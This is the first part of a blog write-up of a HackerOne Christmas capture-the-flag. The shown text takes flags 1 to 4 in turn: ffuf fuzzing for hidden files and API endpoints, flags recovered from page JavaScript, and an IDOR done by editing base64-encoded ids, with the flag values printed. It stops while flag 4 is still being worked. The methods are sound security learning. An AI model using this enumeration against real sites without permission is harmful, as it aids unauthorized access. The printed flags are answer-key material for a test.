<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Hello everyone, for my first blog-post, I’ll be going throw how I managed to takedown the Grinch-Networks and in the end, save Christmas.This was also the first live Hackerone CTF I participated in a">
<meta property="og:type" content="article">
<meta property="og:title" content="Infiltrating into Grinch-Networks and saving Christmas!">
<meta property="og:url" content="http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/index.html">
<meta property="og:site_name" content="castilho">
<meta property="og:description" content="Hello everyone, for my first blog-post, I’ll be going throw how I managed to takedown the Grinch-Networks and in the end, save Christmas.This was also the first live Hackerone CTF I participated in a">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/hackerone-teaser.jpg">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag1_recon.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag2.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag3_rate.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag3_flag.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag4_flag.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag5_login.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag5_file.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag6_example.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag6_payload.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag6_flag.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag7_flag.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag8_password_hash.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag8_flag.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag9_quiz.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag9_quiz_payload.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag9_script.gif">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag9_flag.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag10_flag.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag11_albums.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag11_api.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag11_sqli.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag11_normal.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag11_title.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag11_attacker.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag11_api.gif">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag11_param.gif">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag11_creds.gif">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag11_flag.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag12_buttons.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag12_ssrf.png">
<meta property="og:image" content="http://example.com/images/hackerone-ctf/flag12_flag.png">
<meta property="article:published_time" content="2020-12-25T00:00:00.000Z">
<meta property="article:modified_time" content="2021-05-03T13:48:17.312Z">
<meta property="article:author" content="castilho">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/hackerone-ctf/hackerone-teaser.jpg">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>Infiltrating into Grinch-Networks and saving Christmas!</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Articles</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post " href="/2021/04/10/Bypassing-a-Super-Secure-MFA/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Back to top " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&text=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&title=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&is_video=false&description=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Infiltrating into Grinch-Networks and saving Christmas!&body=Check out this article: http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&title=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&title=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&title=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&title=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&name=Infiltrating into Grinch-Networks and saving Christmas!&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2020/12/25/Infiltrating-into-Grinch-Networks-and-saving-Christmas/&t=Infiltrating into Grinch-Networks and saving Christmas!"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Tools-and-Wordlists"><span class="toc-number">1.</span> <span class="toc-text">Tools and Wordlists</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-1-Recon-is-the-key"><span class="toc-number">2.</span> <span class="toc-text">Flag 1 | Recon is the key</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-2-In-front-of-you"><span class="toc-number">3.</span> <span class="toc-text">Flag 2 | In front of you</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-3-People-Rater"><span class="toc-number">4.</span> <span class="toc-text">Flag 3 | People Rater</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-4-Swag-Shop"><span class="toc-number">5.</span> <span class="toc-text">Flag 4 | Swag Shop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-5-Secure-Login"><span class="toc-number">6.</span> <span class="toc-text">Flag 5 | Secure Login</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-6-My-Diary"><span class="toc-number">7.</span> <span class="toc-text">Flag 6 | My Diary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-7-Hate-Mail-Generator"><span class="toc-number">8.</span> <span class="toc-text">Flag 7 | Hate Mail Generator</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-8-Forum"><span class="toc-number">9.</span> <span class="toc-text">Flag 8 | Forum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-9-Evil-Quiz"><span class="toc-number">10.</span> <span class="toc-text">Flag 9 | Evil Quiz</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-10-Signup-Manager"><span class="toc-number">11.</span> <span class="toc-text">Flag 10 | Signup Manager</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-11-Hell-on-my-Browser"><span class="toc-number">12.</span> <span class="toc-text">Flag 11 | Hell on my Browser</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag-12-Rebinding-Christmas"><span class="toc-number">13.</span> <span class="toc-text">Flag 12 | Rebinding Christmas</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Thanks-and-Final-Thoughts"><span class="toc-number">14.</span> <span class="toc-text">Thanks and Final Thoughts</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Infiltrating into Grinch-Networks and saving Christmas!
    </h1>



    <div class="meta">
      <!--<span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">castilho</span>
      </span>-->
      
    <div class="postdate">
      
        <time datetime="2020-12-25T00:00:00.000Z" itemprop="datePublished">2020-12-25</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <p><img src="/images/hackerone-ctf/hackerone-teaser.jpg" alt="Flag 1 - Recon"></p>
<p>Hello everyone, for my first blog-post, I’ll be going throw how I managed to takedown the Grinch-Networks and in the end, save Christmas.<br>This was also the first live <a target="_blank" rel="noopener" href="https://hackerone.com/">Hackerone</a> CTF I participated in and learned a lot along the way. So, let’s get started!</p>
<h3 id="Tools-and-Wordlists"><a href="#Tools-and-Wordlists" class="headerlink" title="Tools and Wordlists"></a>Tools and Wordlists</h3><p>Tools used throw out this writeup :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/ffuf/ffuf">FFUF</a> - Hidden Web Files/Directories Discovery Tool</li>
<li><a target="_blank" rel="noopener" href="https://github.com/s0md3v/Arjun">Arjun</a> - HTTP Parameter Discovery Tool</li>
<li><a target="_blank" rel="noopener" href="https://www.apachefriends.org/index.html">XAMPP</a> - Local Web Server</li>
<li><a target="_blank" rel="noopener" href="https://github.com/vanhauser-thc/thc-hydra">Hydra</a> - Hydra Brute-force Tool</li>
<li><a target="_blank" rel="noopener" href="https://hashcat.net/hashcat/">HashCat</a> - Advanced Password Recovery</li>
<li><a target="_blank" rel="noopener" href="http://manpages.ubuntu.com/manpages/trusty/man1/fcrackzip.1.html">FCrackZIP</a> - Free/Fast Zip Password Cracker</li>
<li><a target="_blank" rel="noopener" href="https://portswigger.net/burp">BurpSuite</a> - Application Security Testing Software</li>
<li><a target="_blank" rel="noopener" href="https://crackstation.net/">CrackStation</a> - Free Password Hash Cracker</li>
<li><a target="_blank" rel="noopener" href="https://developers.google.com/web/tools/chrome-devtools">Chrome DevTools</a> - Set of Web Developer Tools</li>
<li><a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">DNS Rebinding Service</a> - Service to test for DNS Rebinding Vulnerabilities</li>
</ul>
<p>Wordlist’s used throw out this writeup :</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Names/names.txt">Names.txt</a> - Names Wordlist</li>
<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz">rockyou.txt</a> - Password Wordlist</li>
<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common-api-endpoints-mazen160.txt">API-Endpoints.txt</a> - API Endpoints Wordlist</li>
<li><a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/burp-parameter-names.txt">Burp-Parameters-Names.txt</a> - Parameters Wordlist</li>
</ul>
<h3 id="Flag-1-Recon-is-the-key"><a href="#Flag-1-Recon-is-the-key" class="headerlink" title="Flag 1 | Recon is the key"></a>Flag 1 | Recon is the key</h3><p>The first flag was straightforward, while doing some recon for hidden <strong>files/dirs</strong> with ffuf, we can see that a <strong>robots.txt</strong> file was found:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ ffuf -u https://hackyholidays.h1ctf.com/FUZZ -w common.txt</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : https://hackyholidays.h1ctf.com/FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: common.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: 200,204,301,302,307,401,403</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">robots.txt              [Status: 200, Size: 85, Words: 4, Lines: 3]</span><br><span class="line">:: Progress: [3159/3159] :: Job [1/1] :: 424 req/sec :: Duration: [0:00:07] :: Errors: 0 ::</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Checking the <strong>robots.txt</strong> file, we can find our first flag <code>flag&#123;48104912-28b0-494a-9995-a203d1e261e7&#125;</code> and what seems to be a endpoint for the second flag <code>/s3cr3t-ar3a</code> :</p>
<p><img src="/images/hackerone-ctf/flag1_recon.png" alt="Flag 1 - Recon"></p>
<h3 id="Flag-2-In-front-of-you"><a href="#Flag-2-In-front-of-you" class="headerlink" title="Flag 2 | In front of you"></a>Flag 2 | In front of you</h3><p>When accessing <code>/s3cr3t-ar3a</code> we encounter a message saying <code>Page Moved</code> :</p>
<p><img src="/images/hackerone-ctf/flag2.png" alt="Flag 2"></p>
<p>Running a quick ffuf scan didn’t lead me anywhere neither checking the source.<br /><br>So the next step was checking the <strong>Chrome DevTools</strong> to see if any Javascript was being loaded.<br />Checking the source with the DevTools, we can find our second flag <code>flag&#123;b7ebcb75-9100-4f91-8454-cfb9574459f7&#125;</code> on line 19 :</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-danger text-center&quot;</span> <span class="attr">id</span>=<span class="string">&quot;alertbox&quot;</span> <span class="attr">data-info</span>=<span class="string">&quot;flag&#123;b7ebcb75-9100-4f91-8454-cfb9574459f7&#125;&quot;</span> <span class="attr">next-page</span>=<span class="string">&quot;/apps&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>Side-Note</strong>: We can confirm that the flag is getting loaded by <strong>Javascript</strong> by accessing <code>DevTools -&gt; Sources -&gt; assets/js/jquery.min.js</code> and reviewing line <strong>51</strong> :</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">, h1_0 = <span class="string">&#x27;la&#x27;</span></span><br><span class="line">, h1_1 = <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">, h1_2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">, h1_3 = <span class="string">&#x27;f&#x27;</span></span><br><span class="line">, h1_4 = <span class="string">&#x27;g&#x27;</span></span><br><span class="line">, h1_5 = <span class="string">&#x27;&#123;b7ebcb75&#x27;</span></span><br><span class="line">, h1_6 = <span class="string">&#x27;8454-&#x27;</span></span><br><span class="line">, h1_7 = <span class="string">&#x27;cfb9574459f7&#x27;</span></span><br><span class="line">, h1_8 = <span class="string">&#x27;-9100-4f91-&#x27;</span>;</span><br><span class="line">  <span class="built_in">document</span>.getElementById(<span class="string">&#x27;alertbox&#x27;</span>).setAttribute(<span class="string">&#x27;data-info&#x27;</span>, h1_2 + h1_3 + h1_0 + h1_4 + h1_2 + h1_5 + h1_8 + h1_6 + h1_7 + h1_1);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="Flag-3-People-Rater"><a href="#Flag-3-People-Rater" class="headerlink" title="Flag 3 | People Rater"></a>Flag 3 | People Rater</h3><p>Accessing the challenge we’re welcome with an information message :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">The grinch likes to keep lists of all the people he hates. </span><br><span class="line">This year he&#x27;s gone digital but there might be a record that doesn&#x27;t belong!</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>So from the message, we can understand that we need to find a hidden record.<br /><br>Ok so, first look into the page, we can find <strong>16</strong> names and if we click on one of them, per example <strong>Tea Avery</strong> we will get her rating. </p>
<p><img src="/images/hackerone-ctf/flag3_rate.png" alt="Flag 3 Rate"></p>
<p>Checking the source code we find some interesting Javascript code :</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">$(<span class="string">&#x27;.thelist&#x27;</span>).on(<span class="string">&quot;click&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $.getJSON(<span class="string">&#x27;/people-rater/entry?id=&#x27;</span> + $(<span class="built_in">this</span>).attr(<span class="string">&#x27;data-id&#x27;</span>), <span class="function"><span class="keyword">function</span>(<span class="params">resp</span>)</span>&#123;</span><br><span class="line">        alert( resp.rating );</span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        alert(<span class="string">&#x27;Request failed&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>From the code, we can retrieve a new endpoint <code>/people-rater/entry?id=</code> and can determine that is popping up an alert box by getting the value of <code>data-id</code>.<br /><br>Inspecting the name with <strong>DevTools</strong>, we find the value of of <code>data-id</code> that seems to be base64 encoded <code>eyJpZCI6Mn0=</code>. When decoded, we get :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ echo &quot;eyJpZCI6Mn0=&quot; | base64 -d</span><br><span class="line">&#123;&quot;id&quot;:2&#125;</span><br></pre></td></tr></table></figure>

<p>So at first, I found it weird that the first name had the <strong>id 2</strong> instead of <strong>1</strong>.<br /><br>So I rewrote the id and turned <code>&#123;&quot;id&quot;:2&#125; --&gt; &#123;&quot;id&quot;:1&#125;</code> and then encoded in base64 :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ echo &#x27;&#123;&quot;id&quot;:1&#125;&#x27; | base64</span><br><span class="line">eyJpZCI6MX0K</span><br></pre></td></tr></table></figure>

<p>With our new value base64 encoded, I went to the endpoint <code>/people-rater/entry?id=eyJpZCI6MX0K</code> and like this, we get our third flag :</p>
<p><img src="/images/hackerone-ctf/flag3_flag.png" alt="Flag 3 Flag"></p>
<h3 id="Flag-4-Swag-Shop"><a href="#Flag-4-Swag-Shop" class="headerlink" title="Flag 4 | Swag Shop"></a>Flag 4 | Swag Shop</h3><p>Going into this challenge, we encounter our information about it :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Get your Grinch Merch! Try and find a way to pull the Grinch&#x27;s personal details from the online shop.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Right off the bat, checking the source code we encounter our first clue, some Javascript code :</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$.getJSON(<span class="string">&quot;/swag-shop/api/stock&quot;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">    $.each(o.products, <span class="function"><span class="keyword">function</span>(<span class="params">o, t</span>) </span>&#123;</span><br><span class="line">        $(<span class="string">&quot;.product-holder&quot;</span>).append(<span class="string">&#x27;&lt;div class=&quot;col-md-4 product-box&quot;&gt;&lt;div&gt;&lt;img class=&quot;img-responsive&quot; src=&quot;/images/product_image_coming_soon.jpg&quot;&gt;&lt;/div&gt;&lt;div class=&quot;text-center product-name&quot;&gt;&#x27;</span> + t.name + <span class="string">&#x27;&lt;/div&gt;&lt;div class=&quot;text-center product-cost&quot;&gt;&amp;dollar;&#x27;</span> + t.cost + <span class="string">&#x27;&lt;/div&gt;&lt;div class=&quot;text-center&quot;&gt;&lt;input type=&quot;button&quot; data-product-id=&quot;&#x27;</span> + t.id + <span class="string">&#x27;&quot; class=&quot;btn btn-success purchase&quot; value=&quot;Purchase&quot;&gt;&lt;/div&gt;&lt;/div&gt;&#x27;</span>)</span><br><span class="line">    &#125;), $(<span class="string">&quot;input.purchase&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $.post(<span class="string">&quot;/swag-shop/api/purchase&quot;</span>, &#123;</span><br><span class="line">            id: $(<span class="built_in">this</span>).attr(<span class="string">&quot;data-product-id&quot;</span>)</span><br><span class="line">        &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">            <span class="built_in">window</span>.location = <span class="string">&quot;/swag-shop/checkout/&quot;</span> + o.checkoutURL</span><br><span class="line">        &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            $(<span class="string">&quot;#login_modal&quot;</span>).modal(<span class="string">&quot;show&quot;</span>)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;), $(<span class="string">&quot;.loginbtn&quot;</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $.post(<span class="string">&quot;/swag-shop/api/login&quot;</span>, &#123;</span><br><span class="line">        username: $(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>).val(),</span><br><span class="line">        password: $(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>).val()</span><br><span class="line">    &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">o</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.cookie(<span class="string">&quot;token=&quot;</span> + o.token), <span class="built_in">window</span>.location = <span class="string">&quot;/swag-shop&quot;</span></span><br><span class="line">    &#125;).fail(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        alert(<span class="string">&quot;Login Failed&quot;</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>From this, we can see that the challenge is using some sort of API <code>/swag-shop/api/</code>, so the next step is to find all the possible endpoints. For this, we’ll be using <strong>ffuf</strong>.</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">castilho@box:~$ ffuf -u https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ -w api_endpoints.txt -mc all -fc 404</span><br><span class="line"></span><br><span class="line"> :: Method           : GET</span><br><span class="line"> :: URL              : https://hackyholidays.h1ctf.com/swag-shop/api/FUZZ</span><br><span class="line"> :: Wordlist         : FUZZ: api_endpoints.txt</span><br><span class="line"> :: Follow redirects : false</span><br><span class="line"> :: Calibration      : false</span><br><span class="line"> :: Timeout          : 10</span><br><span class="line"> :: Threads          : 40</span><br><span class="line"> :: Matcher          : Response status: all</span><br><span class="line"> :: Filter           : Response status: 404</span><br><span class="line">________________________________________________</span><br><span class="line"></span><br><span class="line">sessions                [Status: 200, Size: 2194, Words: 1, Lines: 1]</span><br><span class="line">user                    [Status: 400, Size: 35, Words: 3, Lines: 1]</span><br><span class="line">:: Progress: [174/174] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>Note:</strong> We are using the flag <code>-mc</code> to match all the HTTP codes and <code>-fc</code> to filter out 404 code endpoints</p>
<p>We can see that 2 endpoints were found, <strong>/user</strong> and <strong>/sessions</strong>.<br /><br>Checking <strong>/api/user</strong> endpoint, we find a error message :</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;:&quot;Missing required fields&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>From this error message, we can conclude that a parameter is missing, so to fuzz for possible parameters, we’ll be using <strong>Arjun</strong>.</p>
